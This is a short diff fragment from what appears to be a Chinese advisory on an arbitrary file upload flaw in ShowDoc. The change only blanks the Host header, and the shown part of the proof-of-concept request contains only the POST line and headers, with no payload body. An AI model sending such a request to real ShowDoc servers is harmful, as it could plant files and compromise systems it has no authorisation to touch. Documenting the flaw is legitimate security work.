@@ -24,7 +24,7 @@ ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包
 
 ```plain
 POST /index.php?s=/home/page/uploadImg HTTP/1.1
-Host: xxx.xxx.xxx.xxx
+Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
 Content-Length: 239
 Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
